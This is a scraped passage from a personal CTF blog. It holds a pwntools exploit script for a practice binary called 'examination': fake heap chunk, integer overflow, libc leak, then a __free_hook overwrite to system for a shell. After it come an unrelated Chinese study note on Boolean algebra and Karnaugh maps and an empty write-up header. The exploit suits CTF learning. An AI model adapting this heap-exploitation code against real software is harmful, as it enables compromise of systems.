<p><img src="https://img-blog.csdnimg.cn/1f3e82a26750457180542a5bf83c59f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">students = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">reviews = [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">chunk_addr = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">scores = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">current_role = <span class="number">0</span></span><br><span class="line">current_sid = <span class="number">0</span></span><br><span class="line">student_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_student</span>(<span class="params">q</span>):</span><br><span class="line">	<span class="keyword">global</span> student_num</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;enter the number of questions: &#x27;</span>, <span class="built_in">str</span>(q).encode())</span><br><span class="line">	students[student_num] = <span class="number">1</span></span><br><span class="line">	chunk_addr[student_num] = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">	student_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">give_score</span>():</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;marking testing papers.....\n&#x27;</span>)</span><br><span class="line">	sid = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">b&#x27;finish&#x27;</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">b&#x27;score&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">			sid = s[<span class="number">14</span>] - <span class="number">0x30</span></span><br><span class="line">			scores[sid] = <span class="built_in">int</span>(s[<span class="number">29</span>:].decode(), <span class="number">10</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			scores[sid] -= <span class="number">10</span></span><br><span class="line">			<span class="keyword">if</span> scores[sid] &lt; <span class="number">0</span>:</span><br><span class="line">				scores[sid] += <span class="number">256</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_review</span>(<span class="params">sid, size, comment, <span class="built_in">bytes</span>=<span class="literal">False</span>, enter=<span class="literal">True</span></span>):</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span> <span class="keyword">and</span> students[sid] == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which one? &gt; &#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">	<span class="keyword">if</span> reviews[sid] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;please input the size of comment: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	<span class="keyword">if</span> enter:</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">			io.sendlineafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment.encode())</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io.sendlineafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">			io.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment.encode())</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line">	reviews[sid] = comment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_parent</span>(<span class="params">sid</span>):</span><br><span class="line">	<span class="keyword">global</span> student_num</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span> <span class="keyword">and</span> students[sid] == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which student id to choose?&#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">	students[sid] = <span class="number">2</span></span><br><span class="line">	reviews[sid] = <span class="literal">None</span></span><br><span class="line">	student_num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">	<span class="keyword">global</span> current_role</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class="built_in">str</span>(role).encode())</span><br><span class="line">	current_role = role</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_review</span>(<span class="params">address, offset=<span class="literal">True</span></span>):</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> io.recv(<span class="number">4</span>) == <span class="string">b&#x27;Good&#x27;</span>:</span><br><span class="line">		c = chunk_addr[current_sid] = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;add&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">13</span>:].decode(), <span class="number">16</span>)</span><br><span class="line">		chunk_addr[current_sid] -= <span class="number">0x10</span>		<span class="comment"># get the address of chunk head instead of writable head</span></span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;wherever you want! addr: &#x27;</span>, <span class="built_in">str</span>((c + address) * <span class="number">10</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray</span>():</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_sid</span>(<span class="params">sid</span>):</span><br><span class="line">	<span class="keyword">global</span> current_sid</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">1</span> <span class="keyword">and</span> students[sid] != <span class="number">0</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;input your id: &#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">	current_sid = sid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_status</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;students: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(students)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;reviews: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(reviews)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;chunk_addr: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(chunk_addr)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;scores: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(scores)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;current_role: &#x27;</span> + <span class="built_in">str</span>(current_role))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add_student(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0xF0</span>, <span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">1024</span>-<span class="number">16</span>, <span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 1: construct a fake chunk to bypass the check for free() of student 6</span></span><br><span class="line">write_review(<span class="number">4</span>, <span class="number">0x200</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x500</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>), <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 2: give student 4 reward to change the chunk address of student 5 to that of student 6</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">4</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give_score()	<span class="comment"># int overflow</span></span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">4</span>)</span><br><span class="line">check_review(<span class="number">0x39</span> + <span class="number">0x50</span>)</span><br><span class="line">chunk_addr[<span class="number">4</span>] += <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 3: give student 6 reward to change the chunk size of student 6 to 0x100 more</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">6</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give_score()	<span class="comment"># int overflow</span></span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">6</span>)</span><br><span class="line">check_review(<span class="number">0x48</span> + <span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 4: delete student 6 to free the chunk with fake size: 0x500</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">call_parent(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 5: read the comment of student 5 to get and calculate the libc address</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;here is the review:\n&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span></span><br><span class="line">libc_base = main_arena - (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]		<span class="comment"># system address got</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 6: get student 6 back, now the pointer of student 6 should be in the chunk of student 5</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">add_student(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 7: write comment for student 6: &#x27;/bin/sh&#x27;</span></span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">10</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 8: change the address of student 6 to write system address to __free_hook</span></span><br><span class="line">stu6_writeaddr = chunk_addr[<span class="number">4</span>] + <span class="number">0x50</span>	<span class="comment"># address of student 6 to write to</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk_addr[<span class="number">4</span>] + <span class="number">0x30</span>)	<span class="comment"># address of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)	<span class="comment"># size of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(free_hook)	<span class="comment"># change the write address of student 6 to __free_hook</span></span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0</span>, payload, <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 9: write system address to __free_hook</span></span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">0</span>, p64(sys_addr), <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 10: change the address of student 6 back to buffer string &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = p64(chunk_addr[<span class="number">4</span>] + <span class="number">0x30</span>)	<span class="comment"># address of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)	<span class="comment"># size of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(stu6_writeaddr)</span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0</span>, payload, <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 11: delete student 6, getshell</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">call_parent(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-2%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-2%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">数字逻辑 Chapter 2——逻辑代数基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:22" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:22+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2-1-逻辑代数基本概念"><a href="#2-1-逻辑代数基本概念" class="headerlink" title="2.1 逻辑代数基本概念"></a>2.1 逻辑代数基本概念</h1><h2 id="2-1-1-逻辑变量及基本逻辑运算"><a href="#2-1-1-逻辑变量及基本逻辑运算" class="headerlink" title="2.1.1 逻辑变量及基本逻辑运算"></a>2.1.1 逻辑变量及基本逻辑运算</h2><p>一、逻辑变量<br>任何逻辑变量仅有两种可能取值：0或1<br>二、基本逻辑运算：与或非</p>
<h2 id="2-1-2-逻辑函数表示形式"><a href="#2-1-2-逻辑函数表示形式" class="headerlink" title="2.1.2 逻辑函数表示形式"></a>2.1.2 逻辑函数表示形式</h2><ol>
<li>逻辑函数表达式</li>
<li>真值表</li>
<li>卡诺图</li>
</ol>
<h1 id="2-2-逻辑代数公理、基本定理与规则"><a href="#2-2-逻辑代数公理、基本定理与规则" class="headerlink" title="2.2 逻辑代数公理、基本定理与规则"></a>2.2 逻辑代数公理、基本定理与规则</h1><h2 id="2-2-1-公理："><a href="#2-2-1-公理：" class="headerlink" title="2.2.1 公理："></a>2.2.1 公理：</h2><ol>
<li>交换律</li>
<li>结合律</li>
<li>分配律</li>
<li>0-1律</li>
<li>互补律</li>
</ol>
<h2 id="2-2-2-基本定理："><a href="#2-2-2-基本定理：" class="headerlink" title="2.2.2 基本定理："></a>2.2.2 基本定理：</h2><ol>
<li>0与1的与或关系</li>
<li>$A+A&#x3D;A,A\cdot A&#x3D;A$</li>
<li>吸收律：$A\cdot(A+B)&#x3D;A,A+A\cdot B&#x3D;A$</li>
<li>$A+\bar A\cdot B&#x3D;A+B,A\cdot(\bar A+B)&#x3D;AB$</li>
<li>$\overline {\overline A}&#x3D;A$</li>
<li>德摩根律</li>
<li>$A\cdot B+A\cdot \bar B&#x3D;A,(A+B)\cdot(A+\bar B)&#x3D;A$</li>
<li>$A\cdot B+\bar A\cdot C+B\cdot C&#x3D;A\cdot B+\bar A\cdot C,(A+B)\cdot(\bar A+C)\cdot(B+C)&#x3D;(A+B)\cdot(\bar A+C)$</li>
</ol>
<h2 id="2-2-3-重要规则"><a href="#2-2-3-重要规则" class="headerlink" title="2.2.3 重要规则"></a>2.2.3 重要规则</h2><ol>
<li>代入规则</li>
<li>反演规则</li>
<li>对偶规则</li>
</ol>
<h2 id="2-2-4-复合逻辑"><a href="#2-2-4-复合逻辑" class="headerlink" title="2.2.4 复合逻辑"></a>2.2.4 复合逻辑</h2><ol>
<li>与非逻辑：先与后非</li>
<li>或非逻辑：先或后非</li>
<li>与或非逻辑：先与再或后非</li>
<li>异或、同或</li>
</ol>
<h1 id="2-3-逻辑函数表达式两种基本形式"><a href="#2-3-逻辑函数表达式两种基本形式" class="headerlink" title="2.3 逻辑函数表达式两种基本形式"></a>2.3 逻辑函数表达式两种基本形式</h1><h2 id="2-3-1-两种基本形式"><a href="#2-3-1-两种基本形式" class="headerlink" title="2.3.1 两种基本形式"></a>2.3.1 两种基本形式</h2><p>与-或表达式（先与后或）、或-与表达式（先或后与）</p>
<h2 id="2-3-2-标准形式"><a href="#2-3-2-标准形式" class="headerlink" title="2.3.2 标准形式"></a>2.3.2 标准形式</h2><ol>
<li>标准与-或表达式：由一系列最小项或构成的逻辑表达式，也称为最小项表达式。<br>最小项：如果一个具有n个变量的函数的与项包含全部n个变量，每一个变量都以原变量或反变量的形式出现且仅出现1次，则该与项称为最小项。<br><strong>使用m<del>i</del>表示最小项，下标取值规则：按照变量顺序将原变量以1表示，反变量以0表示得到的二进制数。</strong><br>最小项性质：<br>(1) 任意一个最小项相应变量有且仅有一种取值使其值为1<br>(2) 相同变量构成的最小项相与均为0<br>(3) 所有最小项相或为1<br>(4) n个变量构成的最小项有n个相邻最小项（仅有一个变量的原反形式不同）。</li>
<li>标准或-与表达式：由一系列最大项与构成的逻辑表达式，也称为最大项表达式。<br>最大项：如果一个具有n个变量的函数的或项包含全部n个变量，每一个变量都以原变量或反变量的形式出现且仅出现1次，则该或项称为最大项。<br><strong>使用M<del>i</del>表示最大项，下标取值规则与最小项相反：按照变量顺序将原变量以0表示，反变量以1表示得到的二进制数。</strong><br>最大项性质：<br>(1) 任意一个最大项相应变量有且仅有一种取值使其值为0<br>(2) 相同变量构成的最大项相或均为1<br>(3) 所有最大项相与为0<br>(4) n个变量构成的最大项有n个相邻最大项（仅有一个变量的原反形式不同）。</li>
</ol>
<p>最小项与最大项的关系：$\overline {m_i}&#x3D;M_i$</p>
<h2 id="2-3-3-任意逻辑函数表达式转换为标准表达式"><a href="#2-3-3-任意逻辑函数表达式转换为标准表达式" class="headerlink" title="2.3.3 任意逻辑函数表达式转换为标准表达式"></a>2.3.3 任意逻辑函数表达式转换为标准表达式</h2><p>代数转换法、真值表转换法</p>
<ol>
<li>代数转换法：先转换后扩展</li>
<li>真值表转换法：列表直接写</li>
</ol>
<h1 id="2-4-逻辑函数化简"><a href="#2-4-逻辑函数化简" class="headerlink" title="2.4 逻辑函数化简"></a>2.4 逻辑函数化简</h1><h2 id="2-4-1-代数化简"><a href="#2-4-1-代数化简" class="headerlink" title="2.4.1 代数化简"></a>2.4.1 代数化简</h2><p>没有固定步骤可以遵循。<br>最简与或表达式条件：</p>
<ol>
<li>表达式中与项最少</li>
<li>每一个与项的变量个数最少<br>与或表达式化简常用方法：并项、吸收、消去、配项<br>或与表达式化简常用方法：两次对偶法（或与对偶成与或，化简与或后对偶成最简或与）</li>
</ol>
<h2 id="2-4-2-卡诺图化简"><a href="#2-4-2-卡诺图化简" class="headerlink" title="2.4.2 卡诺图化简"></a>2.4.2 卡诺图化简</h2><p>可从图形上直观找出相邻最小项合并（使用卡诺圈）<br>求逻辑函数最简与或表达式的一般步骤：</p>
<ul>
<li>画出函数卡诺图</li>
<li>圈出函数的全部质蕴含项</li>
<li>找出所有必要质蕴含项</li>
<li>求最简质蕴含项集</li>
</ul>
<p>（质蕴含项：不是其他与项子集的与项）<br>卡诺图化简原则：</p>
<ol>
<li>覆盖函数中所有最小项的前提下，卡诺圈的个数应达到最少</li>
<li>满足合并规律的前提下卡诺圈达到最大</li>
<li>根据合并需要，每个最小项可以被多个卡诺圈包围。</li>
</ol>
<p>求最简或与表达式一般步骤：</p>
<ul>
<li>做出卡诺图，求出反函数的最简与或表达式（0格）</li>
<li>对反函数的最简与或表达式取反即得到原函数的最简或与表达式</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-10/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (10)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:21 / Modified: 22:54:18" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:21+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p></p>
